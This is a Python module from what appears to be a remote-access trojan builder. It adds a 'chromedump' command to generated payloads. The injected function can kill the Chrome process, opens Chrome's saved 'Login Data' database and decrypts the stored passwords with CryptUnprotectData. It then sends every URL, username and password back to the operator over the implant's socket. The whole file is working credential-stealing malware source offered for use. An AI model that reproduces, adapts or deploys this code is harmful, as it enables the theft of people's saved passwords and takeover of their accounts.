# GUI + CUI
# done
import library.modules.config as config

config.main()
interface = config.interface


def main(option):
    if option == 'generate':
        config.import_statements.append('import os')
        config.import_statements.append('import sqlite3')
        config.import_statements.append('from subprocess import Popen, PIPE')
        config.import_statements.append('from win32crypt import CryptUnprotectData')
        config.import_statements.append('from subprocess import check_output')
        config.functions.append('''
def chromedump(arg):
    arg = arg.split(' ', 1)[1]
    msg = ''
    if arg == 'active':
        Popen('taskkill /f /im chrome.exe', shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        msg += '[+]Killed chrome process'
    elif arg == 'passive':
        if 'chrome.exe'.encode() in check_output(['tasklist']):
            send_all(s,'[-]Chrome is currently running, this module will not do anything until chrome stops')
            return
    else:
        raise IndexError
        return
    info_list = []
    connection = sqlite3.connect(os.getenv('localappdata') + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\' + 'Login Data')
    with connection:
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()
    for origin_url, username, password in value:    
        password = CryptUnprotectData(
            password, None, None, None, 0)[1]
        if password:
            info_list.append({
                'origin_url': origin_url,
                'username': username,
                'password': str(password)
            })
    msg += '\\n[*]Dumped passwords : '
    if not info_list:
        msg += '\\n[-]No passwords present'
    else:
        for i in info_list:
            msg += '\\n   [+]Username : ' + i['username'].encode('ascii','ignore').decode()
            msg += '\\n      URL      : ' + i['origin_url'].encode('ascii','ignore').decode()
            msg += '\\n      Password : ' + i['password'].encode('ascii','ignore').decode()
    send_all(s,msg)''')
        config.logics.append('''
            elif command == "chromedump":
                chromedump(data)''')
        config.help_menu[
            'chromedump ["active"|"passive"]'] = 'Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Chrome password dump",
                "OS": "Windows",
                "Required Modules": "pypiwin32 (external), os",
                "Commands": "chromedump ['active'|'passive']",
                "Description": "Dumps chrome passwords. If 'active', kills chrome.exe first, if 'passive', will not run if chrome.exe is running"}
        elif interface == "CUI":
            print('\nName             : Chrome password dump' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : pypiwin32 (external), os' \
                  '\nCommands         : chromedump ["active"|"passive"]' \
                  '\nDescription      : Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running \n')
